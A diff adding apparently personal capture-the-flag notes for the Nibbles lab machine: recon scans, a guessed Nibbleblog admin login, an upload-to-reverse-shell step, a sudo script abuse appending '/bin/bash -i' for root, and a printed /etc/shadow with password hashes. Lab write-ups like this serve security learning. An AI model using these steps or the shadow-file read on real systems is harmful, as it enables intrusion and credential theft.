@@ -1,0 +1,224 @@
+10.10.10.75
+
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+
+Searchsploit - Nothing of interest
+
+
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+
+confirmation fron page Apache/2.4.18 (Ubuntu) Server at 10.10.10.75 Port 80
+Searchsploit - Nothing of interest
+
+
+Gobuster
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.75
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/07/16 04:29:07 Starting gobuster in directory enumeration mode
+===============================================================
+/server-status        (Status: 403) [Size: 299]
+                                               
+===============================================================
+2021/07/16 04:35:31 Finished
+===============================================================
+
+
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.75
++ Target Hostname:    10.10.10.75
++ Target Port:        80
++ Start Time:         2021-07-16 04:30:20 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Server may leak inodes via ETags, header found with file /, inode: 5d, size: 5616c3cf7fa77, mtime: gzip
++ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7863 requests: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2021-07-16 04:33:34 (GMT-4) (194 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+
+view-source:http://10.10.10.75/
+/nibbleblog/
+
+
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.75/nibbleblog
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              py,txt,php
+[+] Timeout:                 10s
+===============================================================
+2021/07/16 04:37:24 Starting gobuster in directory enumeration mode
+===============================================================
+/index.php            (Status: 200) [Size: 2987]
+/sitemap.php          (Status: 200) [Size: 402] 
+/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
+/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/] 
+/feed.php             (Status: 200) [Size: 302]                                             
+/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]  
+/admin.php            (Status: 200) [Size: 1401]                                            
+/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
+/install.php          (Status: 200) [Size: 78]                                              
+/update.php           (Status: 200) [Size: 1622]                                            
+/README               (Status: 200) [Size: 4628]                                            
+/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
+/LICENSE.txt          (Status: 200) [Size: 35148]                                             
+/COPYRIGHT.txt        (Status: 200) [Size: 1272]   
+
+
+http://10.10.10.75/nibbleblog/content/private/users.xml
+
+<user username="admin">
+
+
+<users>
+<user username="admin">
+</user>
+<blacklist type="string" ip="10.10.10.1">
+<date type="integer">1512964659</date>
+<fail_count type="integer">1</fail_count>
+</blacklist>
+<blacklist type="string" ip="10.10.14.9">
+<date type="integer">1626424743</date>
+<fail_count type="integer">1</fail_count>
+</blacklist>
+</users>
+Possible blacklist from brute forcing?
+
+
+Uploads folder
+http://10.10.10.75/nibbleblog/content/private/plugins/my_image/
+
+
+Possible creds
+
+admin@nibbles.com
+<user username="admin">
+<seo_site_title type="string">Nibbles - Yum yum
+
+
+
+log in page
+http://10.10.10.75/nibbleblog/admin.php
+
+Nibbleblog security error - Blacklist protection
+
+creds 
+admin
+nibbles
+
+
+image upload
+
+
+Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26
+
+Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27
+
+Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117
+
+Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118
+
+Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43
+
+Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
+
+file in uploads - renamed
+
+reverse shell
+
+
+$ whoami
+nibbler
+
+
+
+cat user.txt
+
+
+
+unzip folder in home directory
+
+nibbler@Nibbles:/home/nibbler/personal/stuff$ monitor.sh
+
+sudo -l                                                                                                                
+Matching Defaults entries for nibbler on Nibbles:                                                                      
+    env_reset, mail_badpass,                               
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                           
+                                                                                                                       
+User nibbler may run the following commands on Nibbles:                                                                
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh   
+
+
+echo "/bin/bash -i" >> monitor.sh
+
+sudo ./monitor.sh
+
+
+whoami
+root
+
+cat root.txt
+
+
+cat /etc/shadow
+root:$6$DewMP6p.$vV1WdlCbgZJkOM98Qw7Dur.A.4YOq910laHkQZu/uMuomOjKntzg5GSsl8pYT0qtW9I.YMkr3HBC0Sw/s3TKq0:17511:0:99999:7:::
+daemon:*:17001:0:99999:7:::
+bin:*:17001:0:99999:7:::
+sys:*:17001:0:99999:7:::
+sync:*:17001:0:99999:7:::
+games:*:17001:0:99999:7:::
+man:*:17001:0:99999:7:::
+lp:*:17001:0:99999:7:::
+mail:*:17001:0:99999:7:::
+news:*:17001:0:99999:7:::
+uucp:*:17001:0:99999:7:::
+proxy:*:17001:0:99999:7:::
+www-data:*:17001:0:99999:7:::
+backup:*:17001:0:99999:7:::
+list:*:17001:0:99999:7:::
+irc:*:17001:0:99999:7:::
+gnats:*:17001:0:99999:7:::
+nobody:*:17001:0:99999:7:::
+systemd-timesync:*:17001:0:99999:7:::
+systemd-network:*:17001:0:99999:7:::
+systemd-resolve:*:17001:0:99999:7:::
+systemd-bus-proxy:*:17001:0:99999:7:::
+syslog:*:17001:0:99999:7:::
+_apt:*:17001:0:99999:7:::
+lxd:*:17431:0:99999:7:::
+messagebus:*:17431:0:99999:7:::
+uuidd:*:17431:0:99999:7:::
+dnsmasq:*:17431:0:99999:7:::
+sshd:*:17431:0:99999:7:::
+mysql:!:17510:0:99999:7:::
+nibbler:$6$X3A8Ojo1$ZixRGB1HEQv552mnnJALZ6hOStYqqJuMoUsFipTFJl22OBupNaqGluyidsq4bZ2oBxr2YH/p4.v/ZaMosY4jZ/:17511:0:99999:7:::
+
